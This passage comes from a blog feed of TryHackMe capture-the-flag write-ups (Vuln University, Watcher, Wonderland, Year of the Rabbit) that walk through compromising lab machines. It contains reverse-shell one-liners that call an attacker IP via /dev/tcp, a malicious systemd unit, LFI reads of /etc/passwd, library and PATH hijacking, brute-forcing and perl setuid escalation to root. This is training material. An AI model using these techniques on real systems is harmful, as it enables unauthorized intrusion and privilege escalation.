1h40m01s, deviation: 2h53m12s, median: 0s |_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu) | Computer name: vulnuniversity | NetBIOS computer name: VULNUNIVERSITY\\x00 | Domain name: \\x00 | FQDN: vulnuniversity |_ System time: 2021-03-07T21:43:45-05:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-03-08T02:43:46 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 47.10 seconds Scan the box, how many ports are open? 6\nWhat version of the squid proxy is running on the machine? 3.5.12\nHow many ports will nmap scan if the flag -p-400 was used? 400 (bruh)\nUsing the nmap flag -n what will it not resolve? dns\nWhat is the most likely operating system this machine is running? ubuntu\nWhat port is the web server running on? 3333\nIts important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don\u0026rsquo;t forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background) ok\nTask 3 - Locating directories using gobuster (have not included the gobuster scan results, since its pretty basic)\nWhat is the directory that has an upload form page? /internal/\nTask 4 - Compromise the webserver We see the option to upload the files. The default way to try and upload the phpreverseshell.php files, but apparently .php is not allowed.\nAt this point, the room suggests using burpsuite to intercept the requests, and try out different php extensions. However, its more simple to just do it by hand :D\nRun this attack, what extension is allowed? phtml\nOnce you have the phprevshell.phtml uploaded, go to /include/uploads/phprevshell.phtml and setup netcat in parallel. Once you get in, get a proper shell by doing python3 -c \u0026quot;import pty; pty.spawn('/bin/bash'). For the next question, just do cat /etc/passwd.\nWhat is the name of the user who manages the webserver? bill\nWhat is the user flag? {hmmmmmmmmmmmmmmmmmmmmmmmm}\nTask 5 - Priviledge Escalation  In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).\n  For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.\n Using the command find, we get:\nOn the system, search for all SUID files. What file stands out? /bin/systemctl\nBecome root and get the last flag (/root/root.txt) For this privesc, I followed Alvin Smith\u0026rsquo;s Privilege Escalation\n[Unit] Description=roooooooooot [Service] Type=simple User=root ExecStart=/bin/bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.8.150.214/9999 0\u0026gt;\u0026amp;1' [Install] WantedBy=multi-user.target Here are the steps:\n create a root.service file on your machine with the details given above. Using the upload option in the /internal/ directory of the website, upload this file. It\u0026rsquo;ll throw and error of the extension as not permitted. Change root.service to root.phtml (why?) and you should be good to go. In the target machine, just rename the file again. Instead of 2, 3, you can also use nc or any other methods you prefer. Run /bin/systemctl enable /var/www/html/internal/uploads/root.service Start nc on your machine, on the port you set in the root.service file in step 1 (9999 here) Run /bin/systemctl start root.service PWN  www-data@vulnuniversity:/var/www/html/internal/uploads$ cat root.service cat root.service [Unit] Description=roooooooooot [Service] Type=simple User=root ExecStart=/bin/bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.8.150.214/9999 0\u0026gt;\u0026amp;1' [Install] WantedBy=multi-user.target www-data@vulnuniversity:/var/www/html/internal/uploads$ /bin/systemctl enable /var/www/html/internal/uploads/root.service \u0026lt;s$ /bin/systemctl enable /var/www/html/internal/uploads/root.service Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /var/www/html/internal/uploads/root.service. Created symlink from /etc/systemd/system/root.service to /var/www/html/internal/uploads/root.service. www-data@vulnuniversity:/var/www/html/internal/uploads$ /bin/systemctl start root.service \u0026lt;r/www/html/internal/uploads$ /bin/systemctl start root.service ❯ nc -lnvp 9999 listening on [any] 9999 ... connect to [10.8.150.214] from (UNKNOWN) [10.10.185.229] 43756 bash: cannot set terminal process group (1792): Inappropriate ioctl for device bash: no job control in this shell root@vulnuniversity:/# whoami whoami root root@vulnuniversity:/# cd /root cd /root root@vulnuniversity:~# ls ls root.txt root@vulnuniversity:~# cat root.txt cat root.txt {hell yeah} root@vulnuniversity:~# ","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/5x36aqY.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-vuln-university-writeup/","title":"TryHackMe: Vuln University Writeup"},{"content":"Play\n1. Enumeration \u0026amp; Exploration 1.1. Port Scanning ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV -A 10.10.157.202 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-25 11:48 EDT Nmap scan report for 10.10.157.202 Host is up (0.24s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA) | 256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA) |_ 256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-generator: Jekyll v4.1.1 |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Corkplacemats 5815/tcp filtered unknown Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.88 seconds ftp, ssh, https. Notin too special. Let\u0026rsquo;s look at web stuff.\n1.2. Web Enumeration ┌──(kali㉿kali)-[~] └─$ gobuster dir -u 10.10.157.202 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 32 -q /images (Status: 301) [Size: 315] [--\u0026gt; http://10.10.157.202/images/] /css (Status: 301) [Size: 312] [--\u0026gt; http://10.10.157.202/css/] /server-status (Status: 403) [Size: 278] This was fairly slow \u0026hellip; and in the end unhelpful. Doing simultaneous exploration is a good idea!\n1.3. Web Exploration The homepage, robots.txt is usually a good place to look. Yes! We have our first flag!\nExploring more, we have the post structure \u0026hellip; sus. LFI? 1.4. PHP LFI Let\u0026rsquo;s try some basic stuff. ../../../etc/hosts works!\nHow about ../../../etc/passwd Interesting candidates:\n mat toby will  Just to check, I tried getting flag_1.txt. Worked. Then, I looked at the second file mentioned in the same robots.txt\nWe get the creds for ftp!\n1.5 FTP Log in.\n┌──(kali㉿kali)-[/tmp] └─$ ftp 10.10.157.202 Connected to 10.10.157.202. 220 (vsFTPd 3.0.3) Name (10.10.157.202:kali): ******* 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -la dr-xr-xr-x 3 65534 65534 4096 Dec 03 01:58 . dr-xr-xr-x 3 65534 65534 4096 Dec 03 01:58 .. drwxr-xr-x 2 1001 1001 4096 Dec 03 03:30 files -rw-r--r-- 1 0 0 21 Dec 03 01:58 flag_2.txt 226 Directory send OK. ftp\u0026gt; get flag_2.txt ftp\u0026gt; cd files ftp\u0026gt; ls -la drwxr-xr-x 2 1001 1001 4096 Dec 03 03:30 . dr-xr-xr-x 3 65534 65534 4096 Dec 03 01:58 .. 226 Directory send OK. Clearly, the message in the file we saw on the web server hinted at directories being connected. We also have the ability to access local files \u0026hellip;\n1.6 LFI + FTP = RCE? I tried putting in a file,\nftp\u0026gt; put haha.png local: haha.png remote: haha.png 200 PORT command successful. Consider using PASV. 150 Ok to send data. 226 Transfer complete. 11007 bytes sent in 0.00 secs (37.4896 MB/s) Works!\n2. Foothold Time to get in. Get the shell from RevShells\nftp\u0026gt; cd files 250 Directory successfully changed. ftp\u0026gt; put phprevshell.php local: phprevshell.php remote: phprevshell.php 200 PORT command successful. Consider using PASV. 150 Ok to send data. 226 Transfer complete. 2585 bytes sent in 0.00 secs (34.7218 MB/s) ftp\u0026gt; 221 Goodbye. Start the listener.\n┌──(kali㉿kali)-[~] └─$ nc -lvnp 1337 listening on [any] 1337 ... connect to [10.17.8.184] from (UNKNOWN) [10.10.157.202] 42726 Linux watcher 4.15.0-128-generic #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 16:25:10 up 39 min, 0 users, load average: 0.00, 0.00, 0.19 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) sh: 0: can't access tty; job control turned off $ bash -i bash: cannot set terminal process group (914): Inappropriate ioctl for device bash: no job control in this shell www-data@watcher:/$ And we have the flag!\nwww-data@watcher:/$ find -type f -name 'flag_3.txt' 2\u0026gt;/dev/null ./var/www/html/more_secrets_******/flag_3.txt ez\n3. Priv Esc 3.1. Lateral PrivEsc: Toby Time to start getting to root.\nwww-data@watcher:/$ sudo -l sudo -l Matching Defaults entries for www-data on watcher: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on watcher: (toby) NOPASSWD: ALL And that was pretty basic \u0026hellip;\nwww-data@watcher:/$ sudo -u toby bash sudo -u toby bash whoami toby Great. How about now looking at what toby got for us.\ntoby@watcher:~$ ls ls flag_4.txt jobs note.txt toby@watcher:~$ cat note.txt cat note.txt Hi Toby, I've got the cron jobs set up now so don't worry about getting that done. Mat Exploring, we find the following. What a script. wow.\ntoby@watcher:~/jobs$ cat cow.sh cat cow.sh #!/bin/bash cp /home/mat/cow.jpg /tmp/cow.jpg The note mentions something to do with cron job. Let\u0026rsquo;s check crontab.\ntoby@watcher:/etc$ cat crontab cat crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don't have to run the `crontab' # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user command 17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) # */1 * * * * mat /home/toby/jobs/cow.sh 3.2. Lateral PrivEsc (again): Mat We put a revshell command and \u0026hellip; we wait!\ntoby@watcher:~/jobs$ cat cow.sh cat cow.sh sh -i \u0026gt;\u0026amp; /dev/tcp/10.17.8.184/1234 0\u0026gt;\u0026amp;1 Listening.\n┌──(kali㉿kali)-[~] └─$ nc -lvnp 1234 listening on [any] 1234 ... connect to [10.17.8.184] from (UNKNOWN) [10.10.157.202] 55854 sh: 0: can't access tty; job control turned off $ whoami mat We are in! Let\u0026rsquo;s explore.\nmat@watcher:~$ cat note.txt cat note.txt Hi Mat, I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe. Will Why do they tell us what to do EXACTLY XD\nmat@watcher:~/scripts$ sudo -l sudo -l Matching Defaults entries for mat on watcher: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User mat may run the following commands on watcher: (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py * mat@watcher:~/scripts$ cat cmd.py cat cmd.py def get_command(num): if(num == \u0026quot;1\u0026quot;): return \u0026quot;ls -lah\u0026quot; if(num == \u0026quot;2\u0026quot;): return \u0026quot;id\u0026quot; if(num == \u0026quot;3\u0026quot;): return \u0026quot;cat /etc/passwd\u0026quot; mat@watcher:~/scripts$ cat will_script.py cat will_script.py import os import sys from cmd import get_command cmd = get_command(sys.argv[1]) whitelist = [\u0026quot;ls -lah\u0026quot;, \u0026quot;id\u0026quot;, \u0026quot;cat /etc/passwd\u0026quot;] if cmd not in whitelist: print(\u0026quot;Invalid command!\u0026quot;) exit() os.system(cmd) Scripts are pretty straight forward. We can\u0026rsquo;t change all the return statements.\nClearly, we need to have a bash command/another rev shell command somewhere before. This requires editing stuff.\nmat@watcher:~/scripts$ python3 -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)' python3 -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)' mat@watcher:~/scripts$ nano cmd.py nano cmd.py Error opening terminal: unknown. Well \u0026hellip; time to ssh in. Follow the tanget to setup ssh below.\nmat@watcher:~$ mkdir .ssh mkdir .ssh mat@watcher:~$ cd .ssh cd .ssh mat@watcher:~/.ssh$ echo \u0026quot;ssh-rsa {blah blah blah} kali@kali\u0026quot; \u0026gt; authorized_keys {some truncated stuff} kali@kali\u0026quot; \u0026gt; authorized_keys mat@watcher:~/.ssh$ SSH permissions setting\nmat@watcher:~/.ssh$ chmod 600 au chmod 600 authorized_keys mat@watcher:~$ chmod 700 .ssh chmod 700 .ssh ┌──(kali㉿kali)-[~/.ssh] └─$ ssh mat@10.10.157.202 ... mat@watcher:~$ YES!\n3.3 Lateral PrivEsc (again) (again): Will We edit and spawn a shell.\nmat@watcher:~/scripts$ cat cmd.py import pty def get_command(num): pty.spawn(\u0026quot;/bin/bash\u0026quot;) if(num == \u0026quot;1\u0026quot;): return \u0026quot;ls -lah\u0026quot; if(num == \u0026quot;2\u0026quot;): return \u0026quot;id\u0026quot; if(num == \u0026quot;3\u0026quot;): return \u0026quot;cat /etc/passwd\u0026quot; mat@watcher:~/scripts$ sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1 will@watcher:~/scripts$ noice.\n3.4 Vertical PrivEsc I did same for linpeas (my fav).\n[+] Readable files belonging to root and readable by me but not world readable -rw-rw---- 1 root adm 2270 Dec 3 02:04 /opt/backups/key.b64 -rw-r----- 1 root adm 21919802 May 25 16:59 /var/log/apache2/access.log -rw-r----- 1 root adm 29610 May 25 16:59 /var/log/apache2/error.log -rw-r----- 1 root adm 0 Dec 3 01:39 /var/log/apache2/other_vhosts_access.log -rw-r----- 1 root adm 28898 Dec 12 15:23 /var/log/apt/term.log First file looks interesting. Lesse\nwill@watcher:/home/will$ cat /opt/backups/key.b64 LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBelBhUUZvbFFx ... LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo= Looks like a id_rsa key format. Decoding base64, we get a private key!\n┌──(kali㉿kali)-[/tmp] └─$ ssh -i id_rsa root@10.10.157.202 Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-128-generic x86_64) ... Last login: Thu Dec 3 03:25:38 2020 root@watcher:~# System fully compromised!\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/WSIsuRG.jpg","permalink":"https://chaudhary1337.github.io/p/tryhackme-watcher-writeup/","title":"TryHackMe: Watcher Writeup"},{"content":"Play\n1. Recon ❯ nmap -script=default -sV -A -T4 10.10.133.60 Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-26 21:51 EST Nmap scan report for 10.10.133.60 Host is up (0.24s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA) | 256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA) |_ 256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519) 80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Follow the white rabbit. Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 53.75 seconds ❯ gobuster dir -u 10.10.133.60 -w \u0026quot;/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\u0026quot; -x \u0026quot;txt,html,php\u0026quot; =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.133.60 [+] Threads: 10 [+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: txt,html,php [+] Timeout: 10s =============================================================== 2021/02/26 21:50:59 Starting gobuster =============================================================== /index.html (Status: 301) /img (Status: 301) /r (Status: 301) In /img/ i first tried downloading the images and doing strings, I could not find anything interesting. Onto /r/. It says\nInteresting. However, source shows nothing special here, and now I am stuck. But it does ask to go somewhere. On a pure whim, I did:\nhttp://10.10.133.60/r/a/b/b/i/t/\nvery nice. One can also run gobuster with the url: http://10.10.133.60/r/ and keep on getting the letters.\nSo now we want to go to the left. How? Well lets do http://10.10.133.60/r/a/b/b/i/\nThe story continues!\nAfter looking at some more, I realise: wait \u0026hellip; I\u0026rsquo;ve been going in the opposite direction! To quote:\n \u0026ldquo;Oh, you’re sure to do that,\u0026rdquo; said the Cat, \u0026ldquo;if you only walk long enough.\u0026rdquo;\n So we must go on \u0026hellip; but where? I don\u0026rsquo;t know.\nI was stuck for a while, and then stumbled upon the fact that its ssh username:password. \u0026ldquo;Open the door\u0026rdquo; makes sense now lmao.\n2. Foothold I\u0026rsquo;m in!\nalice@wonderland:~$ ls root.txt walrus_and_the_carpenter.py alice@wonderland:~$ cat root.txt cat: root.txt: Permission denied alice@wonderland:~$ whoami alice alice@wonderland:~$ pwd /home/alice Okay so the walrus thing is apparently a poem. The script is supposed to spew 10 random lines. very helpful.\nalice@wonderland:/home$ ls alice hatter rabbit tryhackme alice@wonderland:/home$ cd rabbit/ -bash: cd: rabbit/: Permission denied alice@wonderland:/home$ cd hatter/ -bash: cd: hatter/: Permission denied alice@wonderland:/home$ cd tryhackme/ -bash: cd: tryhackme/: Permission denied I tried locating user.txt, but I can\u0026rsquo;t locate anything. Looking at the hint on TryHackMe, it could be in /root/user.txt. It is!\nrabbit@wonderland:/home/rabbit$ cat /root/user.txt thm{:stonks:} 3. Priv Esc We may need to get into the rabbit one. Meanwhile, let\u0026rsquo;s check what we can sudo:\nalice@wonderland:~$ sudo -l [sudo] password for alice: Matching Defaults entries for alice on wonderland: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User alice may run the following commands on wonderland: (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py Ah so we can execute the script as rabbit. alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py\nThis means we can spawn a shell as rabbit!\nBut \u0026hellip; we do not have any permissions to write the file. So how? Well, this is something called python library hijacking. Take a wild guess to what we are going to do.\nYeah, create a file called random.py, essentially overriding the actual random library. Lesgooo!\nrandom.py looks as: import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;). easy.\nExecuting, we have:\nalice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py rabbit@wonderland:~$ YES! okay so we see:\nrabbit@wonderland:/home/rabbit$ ls teaParty which has a set bit \u0026hellip;!?\nrabbit@wonderland:/home/rabbit$ ./teaParty Welcome to the tea party! The Mad Hatter will be here soon. Probably by Sat, 27 Feb 2021 05:19:12 +0000 Ask very nicely, and I will give you some tea while you wait for him Segmentation fault (core dumped) This may include some reverse engineering. Anyways, linpeas gave us this:\n[+] Sudo version [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version Sudo version 1.8.21p2 However,\nrabbit@wonderland:/home/rabbit$ sudo -u#-1 /bin/bash sudo: unknown user: #-1 sudo: unable to initialize policy plugin So, back to reverse engineering it is! I wanted to start off with strings, but it does not want to work, since strings is not present on that machine. So, I need to transfer the file to my machine, then extract out the information I need.\nFor this, we start nc on both;\nrabbit@wonderland:/home/rabbit$ nc 10.8.150.214 1234 \u0026lt; teaParty\nExplaination: netcat tries to connect to the IP 10.8.150.214 on the port 1234 using TCP, and takes in the file as the input.\n❯ nc -lnvp 1234 \u0026gt; temp\nExplaination: netcat listens on the port 1234 on your machine, outputting all the contents into a file called temp.\nOk! Doing strings, we see: /bin/echo -n 'Probably by ' \u0026amp;\u0026amp; date --date='next hour' -R\nWe can make use of the date library in C. Also, no matter our input, we get Segmentation fault (core dumped), as its in the string. Very sneaky! Now, we want it to execute the date file. We can just write: bash in it and make it executable by using chmod +x date.\nrabbit@wonderland:/home/rabbit$ PATH=/home/rabbit:$PATH ./teaParty Welcome to the tea party! The Mad Hatter will be here soon. Probably by hatter@wonderland:/home/rabbit$ :D Inside of /home/hatter, we get\nhatter@wonderland:/home/hatter$ cat password.txt \u0026lt;PASSWORD\u0026gt; Now, we can login as hatter normally, instead of this convoluted mess.\n(We are still in alice\u0026rsquo;s random\u0026rsquo;s rabbit\u0026rsquo;s teaParty shell lmao)\nOkay take a deep breath in. Fresh shell! However \u0026hellip;\nhatter@wonderland:~$ sudo -l [sudo] password for hatter: Sorry, user hatter may not run sudo on wonderland. SMH.\nTime for linpeas again!\n❯ scp ~/Desktop/Tools/linpeas.sh hatter@10.10.27.106:~ hatter@10.10.27.106's password: linpeas.sh 100% 313KB 188.7KB/s 00:01 Okay so the below pops out, talking about suid bit setting capabilities:\nFiles with capabilities: /usr/bin/perl5.26.1 = cap_setuid+ep /usr/bin/mtr-packet = cap_net_raw+ep /usr/bin/perl = cap_setuid+ep Perl looks tasty, so gtfobins tells us the following.\ncp $(which perl) .\nhatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \u0026quot;/bin/sh\u0026quot;;' # whoami root EASY!\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/wnL3bIR.jpg","permalink":"https://chaudhary1337.github.io/p/tryhackme-wonderland-writeup/","title":"TryHackMe: Wonderland Writeup"},{"content":"Challenge Room Play here\nRecon   Go to the website\n  Run a gobuster scan\n  Run a nmap scan\n  Website is the deafault apache website. Let\u0026rsquo;s see if anything looks off. So the css is usually in the website, as seen from the actual default page. Here, its from /assets/style.css.\n  Gobuster also shows the same assets folder\n  Nmap scan looks pretty basic:\n  ❯ nmap -script=default -sV -A -T4 10.10.77.156 Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-24 21:18 EST Nmap scan report for 10.10.77.156 Host is up (0.19s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.2 22/tcp open ssh OpenSSH 6.7p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA) | 2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA) | 256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA) |_ 256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: Apache2 Debian Default Page: It works Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 25.80 seconds Meanwhile, let\u0026rsquo;s have a look at what\u0026rsquo;s exploitable\n❯ searchsploit openssh 6.7p1 --------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path --------------------------------------------------------------------------------------------------- --------------------------------- OpenSSH 2.3 \u0026lt; 7.7 - Username Enumeration | linux/remote/45233.py OpenSSH 2.3 \u0026lt; 7.7 - Username Enumeration (PoC) | linux/remote/45210.py OpenSSH \u0026lt; 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalati | linux/local/40962.txt OpenSSH \u0026lt; 7.4 - agent Protocol Arbitrary Library Loading | linux/remote/40963.txt OpenSSH \u0026lt; 7.7 - User Enumeration (2) | linux/remote/45939.py --------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results ❯ searchsploit vsftpd 3.0.2 Exploits: No Results Shellcodes: No Results ❯ searchsploit httpd 2.4.10 --------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path --------------------------------------------------------------------------------------------------- --------------------------------- OpenBSD HTTPd \u0026lt; 6.0 - Memory Exhaustion Denial of Service | openbsd/dos/41278.txt --------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results So we do have some paths that we can take later down, but currently, we need a foothold.\nWhile looking around, I first of all got rickrolled ;-; and secondly, found this\n /* Nice to see someone checking the stylesheets. Take a look at the page: /sup3r_s3cr3t_fl4g.php */ Nice. Let\u0026rsquo;s go there.\nVery intersting. The page then redirects me to \u0026hellip; ANOTHER RICKROLL. 😠 Let\u0026rsquo;s try turning off the javascript.\nWell well well. Anyways, I want to have a look at the traffic, and how this redirect is happening. Let\u0026rsquo;s fire up burp.\nAh yes. We have\nLet\u0026rsquo;s go there\nSo we have this guy as the url now: http://10.10.77.156/WExYY2Cv-qU/.\nGoing there we have:\nand a reverse image search tells us \u0026hellip; the image is of Lena Forsen, some Swedish model. I don\u0026rsquo;t know how this is helpful.\nI see no other place for exploration, so this is it then. We will search image for oddities.\nNice! doing strings on the Hot_Babe.png shows the ftp username and a list of passwords:\nEh, you've earned this. Username for FTP is ftpuser One of these is the password: Mou+56n%QK8sr 1618B0AUshw1M A56IpIl%1s02u vTFbDzX9\u0026amp;Nmu? FfF~sfu^UQZmT ... I\u0026rsquo;ll run hydra on it, just because they have a nice starting message :)\n❯ hydra -l ftpuser -P pass.txt ftp://10.10.186.25 Hydra v9.1 (c) 2020 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-24 23:01:00 [DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task [DATA] attacking ftp://10.10.186.25:21/ [21][ftp] host: 10.10.186.25 login: ftpuser password: {brrrrrrrrr} 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-24 23:01:16 Yay!\n❯ ftp 10.10.186.25 Connected to 10.10.186.25. 220 (vsFTPd 3.0.2) Name (10.10.186.25:tanishq): ftpuser 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 0 0 758 Jan 23 2020 Eli's_Creds.txt 226 Directory send OK. ftp\u0026gt; get \u0026quot;Eli's_Creds.txt\u0026quot; local: Eli's_Creds.txt remote: Eli's_Creds.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for Eli's_Creds.txt (758 bytes). 226 Transfer complete. 758 bytes received in 0.00 secs (3.2562 MB/s) ftp\u0026gt; Foothold Opening the creds we get something \u0026hellip; this looks like brainfuck, the langauge. yes! compiling it, we get:\nUser: eli Password: {brrrrrrrrrrr} There\u0026rsquo;s nothing else, so let\u0026rsquo;s login as eli.\n❯ ftp 10.10.186.25 Connected to 10.10.186.25. 220 (vsFTPd 3.0.2) Name (10.10.186.25:tanishq): eli 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 1000 1000 4096 Jan 23 2020 Desktop drwxr-xr-x 2 1000 1000 4096 Jan 23 2020 Documents drwxr-xr-x 2 1000 1000 4096 Jan 23 2020 Downloads drwxr-xr-x 2 1000 1000 4096 Jan 23 2020 Music drwxr-xr-x 2 1000 1000 4096 Jan 23 2020 Pictures drwxr-xr-x 2 1000 1000 4096 Jan 23 2020 Public drwxr-xr-x 2 1000 1000 4096 Jan 23 2020 Templates drwxr-xr-x 2 1000 1000 4096 Jan 23 2020 Videos -rw------- 1 1000 1000 589824 Jan 23 2020 core 226 Directory send OK. ftp\u0026gt; pwd 257 \u0026quot;/\u0026quot; After spending some disappointing amount of time on this, I realised we can using ssh. \u0026lt;insert disappointment meme :( \u0026gt;\n❯ ssh eli@10.10.186.25 The authenticity of host '10.10.186.25 (10.10.186.25)' can't be established. ECDSA key fingerprint is SHA256:ISBm3muLdVA/w4A1cm7QOQQOCSMRlPdDp/x8CNpbJc8. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.186.25' (ECDSA) to the list of known hosts. eli@10.10.186.25's password: 1 new message Message from Root to Gwendoline: \u0026quot;Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there\u0026quot; END MESSAGE eli@year-of-the-rabbit:~$ ls core Desktop Documents Downloads Music Pictures Public Templates Videos eli@year-of-the-rabbit:~$ Works! Now, I use the locate command to find all *.txt and I find these interesting things:\n /home/gwendoline/user.txt /var/ftp/uploads/Eli's_Creds.txt  We know the second one. The first one is what we are after.\nUnsurprisingly, we have\n-r--r----- 1 gwendoline 